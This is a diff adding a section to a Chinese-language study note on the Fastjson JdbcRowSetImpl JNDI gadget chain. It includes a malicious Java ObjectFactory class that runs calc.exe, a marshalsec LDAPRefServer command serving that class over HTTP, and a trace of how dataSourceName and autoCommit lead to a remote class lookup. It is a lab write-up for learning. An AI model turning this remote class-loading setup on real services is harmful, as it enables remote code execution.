@@ -275,4 +275,95 @@ loadClass将键值（恶意类）存入clazz中，进入loadClass中查看
 
 ###  JdbcRowSetImpl利⽤链
 
+
+
 头疼，暂时不想看了.....下次再补充吧
+
+------
+
+2022/9/21更新
+
+最近看SRC和毕业设计方面的东西比较多，没有心情看，今天终于再次接上学习进度
+
+------
+
+首先还是先搭建环境然后做复现再进行跟踪链子分析代码
+
+JdbcRowSetImpl链只需要可以控制输入就能利用，然而限制则是不同版本的jdk对jndi和rmi的限制，这里借用互联网上公开的一张图
+
+![img](img/d6172dd335db42d0d6da2c7a88b944a5.png)
+
+恶意类
+
+```java
+import javax.naming.Context;
+import javax.naming.Name;
+import javax.naming.spi.ObjectFactory;
+import java.io.IOException;
+import java.io.Serializable;
+import java.util.Hashtable;
+
+public class Exploit implements ObjectFactory, Serializable {
+    public Exploit(){
+        try{
+            Runtime.getRuntime().exec("calc.exe");
+        }catch (IOException e){
+            e.printStackTrace();
+        }
+    }
+
+    public static void main(String[] args) {
+        Exploit exploit = new Exploit();
+    }
+
+    @Override
+    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
+        return null;
+    }
+}
+```
+
+在命令行中使用javac先编译，然后在当前目录使用python起一个http服务。
+
+![image-20220921171705682](img/image-20220921171705682.png)
+
+使用marshalsec开启jndi
+
+```powershell
+java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:9000/#Exploit 1099
+```
+
+![image-20220921172910673](img/image-20220921172910673.png)
+
+然后将POC运行起来。
+
+![image-20220921172954365](img/image-20220921172954365.png)
+
+没有问题，现在开始跟进代码。
+
+观察POC中可发现调用的是`com.sun.rowset.JdbcRowSetImpl`这个类，后续可以看出是`dataSourceName`字段，所以在`JdbcRowSetImpl`搜索该字段大概就能找到给这个字段赋值的函数在什么位置。
+
+![image-20220921174806103](img/image-20220921174806103.png)
+
+继续跟进其父类中的`setDataSourceName()`方法，因为`getDataSourceName`时，已经不为空了，而是`ldap://localhost:1099/#Exploit`，所以才走到了其父类的同名函数。
+
+![image-20220921175542287](img/image-20220921175542287.png)
+
+这里呢，也是`dataSource`赋值，这一小段就是走到底了，再继续看poc传入的另一个字段`autoCommit`同样的方法，
+
+![image-20220921180642472](img/image-20220921180642472.png)
+
+这也是个赋值的方法，判断`this.coon`是否为`null`，如果为`null`就调用`this.connect()`进行赋值。
+
+继续跟进
+
+![image-20220921181124850](img/image-20220921181124850.png)
+
+发现这里判断了`this.coon`不为空直接返回值，为空则利用`lookup()`方法获取`getDataSourceName`也就是前面分析的那一段，POC中输入的`dataSourceName`
+
+![image-20220921181521753](img/image-20220921181521753.png)
+
+然后就执行了远程VPS上的恶意类（Exploit.class）最后执行图就不贴了。
+
+这个相对来说链子短一些，分析起来比较容易。
+
